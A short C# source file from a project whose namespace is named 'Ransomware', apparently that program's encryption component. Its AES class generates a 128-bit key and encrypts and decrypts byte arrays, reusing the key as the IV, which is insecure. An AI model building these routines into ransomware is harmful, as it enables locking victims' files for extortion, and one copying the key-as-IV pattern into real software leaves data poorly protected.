using System.Security.Cryptography;

namespace Ransomware;

public class AES
{
	public static byte[] generateKey()
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.GenerateKey();
		return rijndaelManaged.Key;
	}

	public static byte[] encrypt(byte[] data, byte[] key)
	{
		return new RijndaelManaged
		{
			KeySize = 128
		}.CreateEncryptor(key, key).TransformFinalBlock(data, 0, data.Length);
	}

	public static byte[] decrypt(byte[] byte_ciphertext, byte[] key)
	{
		return new RijndaelManaged
		{
			KeySize = 128
		}.CreateDecryptor(key, key).TransformFinalBlock(byte_ciphertext, 0, byte_ciphertext.Length);
	}
}
